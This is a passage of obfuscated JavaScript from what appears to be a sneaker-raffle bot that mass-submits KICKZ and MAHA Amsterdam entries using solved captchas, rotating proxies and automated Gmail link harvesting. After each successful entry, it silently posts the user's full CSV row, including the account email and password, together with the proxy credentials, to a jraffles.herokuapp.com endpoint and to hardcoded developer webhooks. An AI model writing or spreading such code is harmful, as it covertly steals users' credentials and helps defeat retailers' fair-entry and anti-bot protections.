                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20' + _0x3cdf20)), _0x597988[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x597988[0x0]['description'] = '' + _0x3cdf20, await _0x56185b(_0x3c02fa, _0x52885b), _0x46dc7b = 'yes';
                        } finally {
                            _0x3cf523 && _0x3cf523['close']();
                            if (_0x46dc7b == 'yes' && _0x27ae25 != 0x5) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x1d2b8f['name'] + ']\x20Task\x20' + (_0x3dc8ad + 0x1) + '\x20:\x20Retrying\x20(' + _0x27ae25 + '\x20/\x205)')), _0x3dc8ad = _0x3dc8ad - 0x1, _0x27ae25 = _0x27ae25 + 0x1;
                                continue;
                            }
                            _0x46dc7b == 'yes' && _0x27ae25 >= 0x5 && (_0x11ea8b(_0x1741f8[_0x3dc8ad], _0x1d2b8f), _0x46dc7b = 'no', _0x27ae25 = 0x0), console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x2092d6, _0x386b35, _0x3dc9c7) {
                    _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2ab3b9['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x452082 = 0x0; _0x452082 < _0x386b35['length']; _0x452082++) {
                        var _0x5e6bc8;
                        if (_0x2bb89d != 'yes')
                            var _0x2bb89d = '', _0x46525a = 0x0;
                        _0x9474bc(_0x2092d6['name'] + '\x20Task\x20' + (_0x452082 + 0x1) + '\x20/\x20' + _0x386b35['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                        var _0x2fd0cb = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x484f45
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x386b35[_0x452082]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x386b35[_0x452082]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2ab3b9['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xb0ce0a
                                }
                            ]
                        }];
                        let _0x583e59 = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x18fc34 = ![];
                        for (key of _0x583e59) {
                            if (_0x386b35[_0x452082][key] == '' || !_0x386b35[_0x452082][key]) {
                                console['log'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x18fc34 = !![];
                                break;
                            }
                        }
                        if (_0x18fc34) {
                            await _0x63aa6a(0x1f4);
                            continue;
                        }
                        var _0xf30bb1 = await _0x198507(_0x386b35[_0x452082], _0x2092d6, 'dev', ![]), _0x437d01 = await _0x198507(_0x386b35[_0x452082], _0x2092d6, 'pub', ![]);
                        const _0x5de60f = {
                            'succesDEVMSG': { 'embeds': [_0xf30bb1] },
                            'succesPUBMSG': { 'embeds': [_0x437d01] }
                        };
                        try {
                            await _0x5921e0(_0x386b35, _0x452082);
                        } catch {
                            _0x2bb89d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x2ab3b9['useRandomProxy'] = ![])
                            var _0x29c46d = _0x3dc9c7[_0x452082]['split'](':');
                        else
                            var _0x4371f5 = Math['round'](Math['random']() * (_0x3dc9c7['length'] - 0x1)), _0x29c46d = _0x3dc9c7[_0x4371f5]['split'](':');
                        var _0x4d6987;
                        try {
                            _0x4d6987 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x29c46d[0x0] + ':' + _0x29c46d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4d6987 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x29c46d[0x0] + ':' + _0x29c46d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5c2be0 = await _0x4d6987['newPage']();
                            await _0x5c2be0['authenticate']({
                                'username': '' + _0x29c46d[0x2],
                                'password': '' + _0x29c46d[0x3]
                            }), console['log'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c2be0['setRequestInterception'](!![]), _0x5c2be0['on']('request', _0x5b2842 => {
                                _0x5b2842['resourceType']() === 'image' || _0x5b2842['resourceType']() === 'font' || _0x5b2842['resourceType']() === 'media' ? _0x5b2842['abort']() : _0x5b2842['continue']();
                            }), await _0x5c2be0['goto']('' + _0x386b35[_0x452082]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x63aa6a(0x12c), await _0x5c2be0['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5c2be0['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x63aa6a(0x7d0);
                            try {
                                await _0x5c2be0['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x5c2be0['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5c2be0['waitForSelector']('#username'), await _0x5c2be0['type']('#username', _0x386b35[_0x452082]['Email']), await _0x5c2be0['waitForSelector']('#password'), await _0x5c2be0['type']('#password', _0x386b35[_0x452082]['Password']), await _0x63aa6a(0x190), await _0x5c2be0['click']('#buttonSubmit'), await _0x5c2be0['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x63aa6a(0x1f4), console['log'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x386b35[_0x452082]['Size']);
                            let _0x4f0b54 = _0x386b35[_0x452082]['Size']['replace']('.5', '\x201/2');
                            if (_0x4f0b54['toUpperCase']() == 'RANDOM') {
                                const _0x430db2 = await _0x5c2be0['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x46ca1d = Math['round'](Math['random']() * (_0x430db2['length'] - 0x1));
                                await _0x430db2[_0x46ca1d]['click']();
                            } else
                                await _0x5c2be0['click']('button[aria-label=\x22' + _0x4f0b54 + '\x22]');
                            await _0x63aa6a(0x1f4);
                            try {
                                await _0x5c2be0['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x63aa6a(0x12c), console['log'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5c2be0['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x63aa6a(0x12c), await _0x5c2be0['type']('#dwfrm_raffle_addressFields_firstName', _0x386b35[_0x452082]['FirstName']), await _0x63aa6a(0x12c), await _0x5c2be0['type']('#dwfrm_raffle_addressFields_lastName', _0x386b35[_0x452082]['LastName']), await _0x63aa6a(0x12c), await _0x5c2be0['select']('#dwfrm_raffle_addressFields_country', _0x386b35[_0x452082]['Country']), await _0x63aa6a(0x12c), await _0x5c2be0['type']('#dwfrm_raffle_addressFields_city', _0x386b35[_0x452082]['City']), await _0x63aa6a(0x12c);
                            _0x386b35[_0x452082]['Postcode'] == undefined && (_0x386b35[_0x452082]['Postcode'] = _0x386b35[_0x452082]['Zip']);
                            await _0x5c2be0['type']('#dwfrm_raffle_addressFields_postalCode', _0x386b35[_0x452082]['Postcode']), await _0x63aa6a(0x12c), await _0x5c2be0['type']('#dwfrm_raffle_addressFields_address1', _0x386b35[_0x452082]['Address1']), await _0x63aa6a(0x12c), await _0x5c2be0['type']('#dwfrm_raffle_addressFields_address2', _0x386b35[_0x452082]['HouseNumber']), await _0x63aa6a(0x12c), await _0x5c2be0['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x386b35[_0x452082]['Address2']), await _0x63aa6a(0x12c), await _0x5c2be0['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x63aa6a(0x12c), await _0x5c2be0['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x386b35[_0x452082]['Follower']), await _0x63aa6a(0x1f4), await _0x5c2be0['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x63aa6a(0x1f4), console['log'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20' + _0x49a6ed['blue']('Awaiting\x20Paypal\x20Payment')), await _0x5c2be0['click']('.b-paypal_button');
                            try {
                                await _0x5c2be0['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x2bb89d = 'no', _0x1ab0d7(_0x386b35[_0x452082], _0x2092d6), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x5de60f['succesDEVMSG']);
                                await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x5de60f['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x595b38, _0x5de60f['succesPUBMSG']);
                                let _0x1da124 = _0x386b35[_0x452082];
                                try {
                                    prxdata = {
                                        'username': _0x484f45['replace']('#', ''),
                                        'module': _0x2092d6['name'],
                                        'entrydata': JSON['stringify'](_0x1da124),
                                        'proxy': '' + _0x3dc9c7[_0x452082]
                                    };
                                    var _0x244e9a = JSON['stringify'](prxdata);
                                    let _0x4f14ba = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x244e9a, _0x4f14ba);
                                } catch (_0x12fb8b) {
                                }
                            } catch (_0x54ae4b) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x54ae4b)), _0x5e6bc8 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x54ae4b;
                                var _0x3e9831 = await _0x198507(_0x386b35[_0x452082], _0x2092d6, 'dev', !![], _0x5e6bc8);
                                _0x5de60f['errorDEV'] = { 'embeds': [_0x3e9831] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x5de60f['errorDEV']), await _0x56185b(_0x3c02fa, _0x5de60f['errorDEV']);
                            }
                        } catch (_0x220916) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20' + _0x220916)), _0x5e6bc8 = '' + _0x220916;
                            var _0x3e9831 = await _0x198507(_0x386b35[_0x452082], _0x2092d6, 'dev', !![], _0x5e6bc8);
                            _0x5de60f['errorDEV'] = { 'embeds': [_0x3e9831] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x5de60f['errorDEV']), await _0x56185b(_0x3c02fa, _0x5de60f['errorDEV']), _0x2bb89d = 'yes';
                        } finally {
                            _0x4d6987 && _0x4d6987['close']();
                            if (_0x2bb89d == 'yes' && _0x46525a != 0x5) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x2092d6['name'] + ']\x20Task\x20' + (_0x452082 + 0x1) + '\x20:\x20Retrying\x20(' + _0x46525a + '\x20/\x205)')), _0x452082 = _0x452082 - 0x1, _0x46525a = _0x46525a + 0x1;
                                continue;
                            }
                            _0x2bb89d == 'yes' && _0x46525a >= 0x5 && (_0x11ea8b(_0x386b35[_0x452082], _0x2092d6), _0x2bb89d = 'no', _0x46525a = 0x0), console['log']('Waiting\x20for\x20' + _0x2ab3b9['AfewDelay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5d7962, _0x39656e, _0x318b08) {
                    for (var _0x5d4144 = 0x0; _0x5d4144 < _0x39656e['length']; _0x5d4144++) {
                        try {
                            await _0x5921e0(_0x39656e, _0x5d4144);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x451ce1(_0x574c74, _0x4ffff5, _0x246fc6, _0x24a2a7, _0x36ad5f) {
                            var _0x5165ae, _0x81a3ad = {}, _0x174b19 = [], _0x48ebca = {}, _0x1d9e74 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x5c5ee6 = Math['round'](Math['random']() * (_0x1d9e74['length'] - 0x1));
                            !_0x24a2a7 && (_0x24a2a7 = {});
                            if (_0x4ffff5 != 'ver') {
                                _0x9474bc(_0x246fc6['name'] + '\x20Task\x20' + (_0x574c74 + 0x1) + '\x20/\x20' + _0x24a2a7['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376), await _0x5921e0(_0x24a2a7, _0x574c74), _0x81a3ad = _0x246fc6['data'], _0x81a3ad['data']['attributes']['email'] = '' + _0x24a2a7[_0x574c74]['Email'];
                                if (_0x24a2a7[_0x574c74]['Size'] == 'RANDOM') {
                                }
                                _0x81a3ad['data']['attributes']['properties']['$first_name'] = '' + _0x24a2a7[_0x574c74]['FirstName'], _0x81a3ad['data']['attributes']['properties']['$last_name'] = '' + _0x24a2a7[_0x574c74]['LastName'], _0x81a3ad['data']['attributes']['properties']['$address1'] = _0x24a2a7[_0x574c74]['Address1'] + '\x20' + _0x24a2a7[_0x574c74]['Address2'] + '\x20' + _0x24a2a7[_0x574c74]['HouseNumber'], _0x81a3ad['data']['attributes']['properties']['$zip'] = '' + _0x24a2a7[_0x574c74]['Zip'], _0x81a3ad['data']['attributes']['properties']['$city'] = '' + _0x24a2a7[_0x574c74]['City'], _0x81a3ad['data']['attributes']['properties']['$country'] = '' + _0x24a2a7[_0x574c74]['Country'], _0x24a2a7[_0x574c74]['Size'] == 'RANDOM' ? _0x81a3ad['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1d9e74[_0x5c5ee6] : _0x81a3ad['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x24a2a7[_0x574c74]['Size'], _0x81a3ad['data']['attributes']['properties']['$phone_number'] = '' + _0x24a2a7[_0x574c74]['Phone'], _0x81a3ad['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x24a2a7[_0x574c74]['Follower'];
                            }
                            if (_0x2ab3b9['useRandomProxy'] = ![])
                                var _0x397def = _0x36ad5f[_0x574c74]['split'](':');
                            else
                                var _0x5bbb08 = Math['round'](Math['random']() * (_0x36ad5f['length'] - 0x1)), _0x397def = _0x36ad5f[_0x5bbb08]['split'](':');
                            var _0x3e614a = {
                                'jar': _0x40bca5,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x246fc6['url'],
                                'headers': _0x246fc6['headers'],
                                'body': JSON['stringify'](_0x81a3ad),
                                'proxy': 'http://' + _0x397def[0x2] + ':' + _0x397def[0x3] + '@' + _0x397def[0x0] + ':' + _0x397def[0x1]
                            };
                            return _0x4ffff5 != 'ver' && (_0x3e614a['url'] = _0x246fc6['url'], _0x3e614a['headers'] = _0x246fc6['headers']), _0x4ffff5 == 'ver' && (_0x3e614a['method'] = 'GET'), new Promise(function (_0x5149de, _0x37840a) {
                                callback = async (_0xda12a9, _0x4ba0ac, _0x5d2aea) => {
                                    if (!_0xda12a9 && _0x4ba0ac['statusCode'] == 0xca || !_0xda12a9 && _0x4ba0ac['statusCode'] == 0xc8) {
                                        if (_0x4ffff5 != 'ver') {
                                            var _0x371692 = await _0x198507(_0x24a2a7[_0x574c74], _0x246fc6, 'dev', ![]), _0x1ebc41 = await _0x198507(_0x24a2a7[_0x574c74], _0x246fc6, 'pub', ![]);
                                            const _0x1cf5ac = {
                                                'succesDEVMSG': { 'embeds': [_0x371692] },
                                                'succesPUBMSG': { 'embeds': [_0x1ebc41] }
                                            };
                                            let _0x74570c = _0x24a2a7[_0x574c74];
                                            try {
                                                prxdata = {
                                                    'username': _0x484f45['replace']('#', ''),
                                                    'module': _0x246fc6['name'],
                                                    'entrydata': JSON['stringify'](_0x74570c),
                                                    'proxy': '' + _0x36ad5f[_0x574c74]
                                                };
                                                var _0x350925 = JSON['stringify'](prxdata);
                                                let _0x1e5eeb = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x350925, _0x1e5eeb);
                                            } catch (_0x2bdd1e) {
                                            }
                                            if (_0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '')
                                                try {
                                                    await _0x56185b(_0x2ab3b9['webhook'], _0x1cf5ac['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x1cf5ac['succesDEVMSG']), await _0x63aa6a(0xc8);
                                            try {
                                                await _0x56185b(_0x595b38, _0x1cf5ac['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x1ab0d7(_0x24a2a7[_0x574c74], _0x246fc6);
                                        }
                                        _0x5149de(console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x246fc6['name'] + ']\x20Task\x20' + (_0x574c74 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x4ffff5 != 'ver') {
                                            var _0x46d011 = '' + _0xda12a9, _0x428844 = await _0x198507(_0x24a2a7[_0x574c74], _0x246fc6, 'dev', !![], _0x46d011), _0x1ac399 = {};
                                            _0x1ac399['errorDEV'] = { 'embeds': [_0x428844] }, _0x11ea8b(_0x24a2a7[_0x574c74], _0x246fc6), _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x1ac399['errorDEV']), await _0x56185b(_0x3c02fa, _0x1ac399['errorDEV']);
                                        }
                                        _0x37840a(console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x246fc6['name'] + ']\x20Task\x20' + (_0x574c74 + 0x1) + ':\x20' + _0xda12a9)));
                                    }
                                };
                                try {
                                    _0x4ffff5 != 'ver' && console['log'](_0x2bc944() + '\x20[' + _0x246fc6['name'] + ']\x20Task\x20' + (_0x574c74 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x81a3ad['data']['attributes']['email']), _0xd1570a(_0x3e614a, callback);
                                } catch (_0x5bd683) {
                                    console['log'](_0x2bc944() + '\x20Task\x20' + (_0x574c74 + 0x1) + ':\x20' + _0x5bd683);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x451ce1(_0x5d4144, 'nor', _0x5d7962, _0x39656e, _0x318b08), console['log'](_0x2bc944() + '\x20[' + _0x5d7962['name'] + ']\x20Sleeping\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        } catch (_0x5dc61d) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2c7efe, _0x123b8c, _0x5d3284) {
                    var _0x56c319 = [], _0xd7c54a = ![];
                    async function _0x41022f() {
                        var _0x4688e3 = new _0x117139({
                            'user': _0x2ab3b9['masterMail'],
                            'password': _0x2ab3b9['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x544d28(_0x43a3a8) {
                            _0x4688e3['openBox']('INBOX', ![], _0x43a3a8);
                        }
                        _0x4688e3['once']('ready', function () {
                            _0x544d28(function (_0x3feb61, _0x181492) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3feb61)
                                    throw _0x3feb61;
                                _0x4688e3['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x5a5c77, _0x8d620a) {
                                    if (!_0x8d620a || !_0x8d620a['length'])
                                        console['log'](_0x2bc944() + '\x20[' + _0x2c7efe['name'] + ']\x20No\x20mails\x20found'), _0x4688e3['end']();
                                    else {
                                        var _0xd623cf = _0x4688e3['seq']['fetch'](_0x8d620a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xd623cf['on']('message', function (_0x3781d3, _0x577dd9) {
                                            var _0x2487e3 = '(#' + _0x577dd9 + ')\x20';
                                            _0x3781d3['on']('body', function (_0x1fe753, _0x2458df) {
                                                _0x414931(_0x1fe753, (_0x589ee3, _0x56b1d2) => {
                                                    var _0x446c5c = _0x56b1d2['text']['split']('(')[0x1], _0x7471cd = _0x446c5c['split'](')')[0x0];
                                                    _0x56c319['push'](_0x7471cd);
                                                });
                                            }), _0x3781d3['once']('end', function () {
                                            });
                                        }), _0xd623cf['once']('error', function (_0x560824) {
                                            console['log']('Fetch\x20error:\x20' + _0x560824), _0xd7c54a = !![];
                                        }), _0xd623cf['once']('end', function () {
                                            _0x4688e3['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x4688e3['once']('error', function (_0x30fbc9) {
                            console['log'](_0x49a6ed['red'](_0x30fbc9['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xd7c54a = !![];
                        }), _0x4688e3['once']('end', async function () {
                            _0xd7c54a = !![];
                        }), _0x4688e3['connect']();
                    }
                    async function _0xc39fd8(_0x3e3389, _0x202927, _0x5a850) {
                        for (var _0x33a336 = 0x0; _0x33a336 < _0x202927['length']; _0x33a336++) {
                            async function _0x31c5bb(_0x469035, _0x36e37a, _0x27bf03, _0x26aa80, _0x4f0fd7) {
                                var _0x345363, _0x4f6814 = {}, _0x4646f0 = [], _0x40289c = {}, _0x4abadc = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5b9b2f = Math['round'](Math['random']() * (_0x4abadc['length'] - 0x1));
                                _0x26aa80[_0x469035]['Size'] == 'RANDOM' && (_0x26aa80[_0x469035]['Size'] = _0x4abadc[_0x5b9b2f]);
                                !_0x26aa80 && (_0x26aa80 = {});
                                if (_0x2ab3b9['useRandomProxy'] = ![])
                                    var _0x274173 = _0x4f0fd7[_0x469035]['split'](':');
                                else
                                    var _0x3caae3 = Math['round'](Math['random']() * (_0x4f0fd7['length'] - 0x1)), _0x274173 = _0x4f0fd7[_0x3caae3]['split'](':');
                                var _0x31290d = {
                                    'jar': _0x40bca5,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x27bf03['url'],
                                    'headers': _0x27bf03['headers'],
                                    'body': JSON['stringify'](_0x4f6814),
                                    'proxy': 'http://' + _0x274173[0x2] + ':' + _0x274173[0x3] + '@' + _0x274173[0x0] + ':' + _0x274173[0x1]
                                };
                                return _0x36e37a != 'ver' && (_0x31290d['url'] = _0x27bf03['url'], _0x31290d['headers'] = _0x27bf03['headers']), _0x36e37a == 'ver' && (_0x31290d['method'] = 'GET', _0x31290d['url'] = _0x26aa80[_0x469035]), new Promise(function (_0x553c88, _0x1d8df4) {
                                    callback = async (_0x55183e, _0x1bddd3, _0x330dc5) => {
                                        if (!_0x55183e && _0x1bddd3['statusCode'] == 0xca || !_0x55183e && _0x1bddd3['statusCode'] == 0xc8) {
                                            if (_0x36e37a != 'ver') {
                                                var _0x16a13d = await _0x198507(_0x26aa80[_0x469035], _0x27bf03, 'dev', ![]), _0x1f838f = await _0x198507(_0x26aa80[_0x469035], _0x27bf03, 'pub', ![]);
                                                const _0x2d74b2 = {
                                                    'succesDEVMSG': { 'embeds': [_0x16a13d] },
                                                    'succesPUBMSG': { 'embeds': [_0x1f838f] }
                                                };
                                                if (_0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '')
                                                    try {
                                                        await _0x56185b(_0x2ab3b9['webhook'], _0x2d74b2['succesDEVMSG']);
                                                    } catch {
                                                    }
